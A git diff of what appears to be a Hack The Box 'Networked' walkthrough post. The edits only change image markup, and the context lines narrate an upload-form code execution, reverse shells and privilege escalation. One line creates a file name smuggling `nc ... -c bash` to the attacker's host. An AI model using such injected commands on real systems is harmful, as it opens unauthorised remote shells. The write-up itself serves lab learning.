@@ -62,9 +62,9 @@ PORT   STATE SERVICE REASON         VERSION
 
 Looks like we have only the `http` service to explore. Here's what it looks like.
 
-<a class="image-popup">
-![7759278b.png](/assets/images/posts/networked-htb-walkthrough/7759278b.png)
-</a>
+
+{% include image.html image_alt="7759278b.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/7759278b.png" %}
+
 
 I've no idea what it means. Well, moving on to the next step.
 
@@ -97,15 +97,15 @@ Requests/sec.: 49.25974
 
 The directory `/backup` sure looks interesting.
 
-<a class="image-popup">
-![665e6cf9.png](/assets/images/posts/networked-htb-walkthrough/665e6cf9.png)
-</a>
+
+{% include image.html image_alt="665e6cf9.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/665e6cf9.png" %}
+
 
 Let's download it and see what's inside.
 
-<a class="image-popup">
-![d50974c8.png](/assets/images/posts/networked-htb-walkthrough/d50974c8.png)
-</a>
+
+{% include image.html image_alt="d50974c8.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/d50974c8.png" %}
+
 
 Looks like the backup of the PHP files present in the site. If the acutal `upload.php` is identical to that of the backup, then there's a vulnerability with the upload form.
 
@@ -151,15 +151,15 @@ Let's give it a shot.
 <p>file uploaded, refresh gallery</p>
 ```
 
-<a class="image-popup">
-![65789937.png](/assets/images/posts/networked-htb-walkthrough/65789937.png)
-</a>
+
+{% include image.html image_alt="65789937.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/65789937.png" %}
+
 
 Awesome. It got uploaded.
 
-<a class="image-popup">
-![844b4736.png](/assets/images/posts/networked-htb-walkthrough/844b4736.png)
-</a>
+
+{% include image.html image_alt="844b4736.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/844b4736.png" %}
+
 
 And we got remote code execution!
 
@@ -167,15 +167,15 @@ And we got remote code execution!
 
 The creator was kind to leave `ncat` installed. We can simply use that to give us a reverse shell.
 
-<a class="image-popup">
-![77c4e58d.png](/assets/images/posts/networked-htb-walkthrough/77c4e58d.png)
-</a>
+
+{% include image.html image_alt="77c4e58d.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/77c4e58d.png" %}
+
 
 On my `nc` listener, a reverse shell comes knocking.
 
-<a class="image-popup">
-![3ccf4fda.png](/assets/images/posts/networked-htb-walkthrough/3ccf4fda.png)
-</a>
+
+{% include image.html image_alt="3ccf4fda.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/3ccf4fda.png" %}
+
 
 ## Privilege Escalation
 
@@ -235,25 +235,25 @@ $ touch ';nc 10.10.12.161 4321 -c bash'
 
 Three minutes later, a reverse shell as `guly` appears in my `nc` listener.
 
-<a class="image-popup">
-![a23e4e9b.png](/assets/images/posts/networked-htb-walkthrough/a23e4e9b.png)
-</a>
+
+{% include image.html image_alt="a23e4e9b.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/a23e4e9b.png" %}
+
 
 Let's [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) our shell to full TTY.
 
 The file `user.txt` is at `guly`'s home directory.
 
-<a class="image-popup">
-![94e11c09.png](/assets/images/posts/networked-htb-walkthrough/94e11c09.png)
-</a>
+
+{% include image.html image_alt="94e11c09.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/94e11c09.png" %}
+
 
 ### Getting `root.txt`
 
 During enumeration of `guly`'s account, I notice `guly` is able to run the following command as `root` without password.
 
-<a class="image-popup">
-![f1268379.png](/assets/images/posts/networked-htb-walkthrough/f1268379.png)
-</a>
+
+{% include image.html image_alt="f1268379.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/f1268379.png" %}
+
 
 Check out the code in the script.
 
@@ -283,21 +283,21 @@ done
 
 Firstly, all the network scripts are written in `bash`. Furthermore, the single space character is allowed in the regular expression. Space is recognized as one of internal field separators (or IFS), which in this case really plays to our advantage, as you shall see.
 
-<a class="image-popup">
-![276eb6e4.png](/assets/images/posts/networked-htb-walkthrough/276eb6e4.png)
-</a>
+
+{% include image.html image_alt="276eb6e4.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/276eb6e4.png" %}
+
 
 Any of the variables can be used to execute a command in the second field separated by a single space.
 
-<a class="image-popup">
-![001c116e.png](/assets/images/posts/networked-htb-walkthrough/001c116e.png)
-</a>
+
+{% include image.html image_alt="001c116e.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/001c116e.png" %}
+
 
 Getting `root.txt` with a `root` shell is trivial.
 
-<a class="image-popup">
-![3f8f640f.png](/assets/images/posts/networked-htb-walkthrough/3f8f640f.png)
-</a>
+
+{% include image.html image_alt="3f8f640f.png" image_src="/6068fb94-75a3-457c-bf70-9853d9114395/3f8f640f.png" %}
+
 
 :dancer:
 
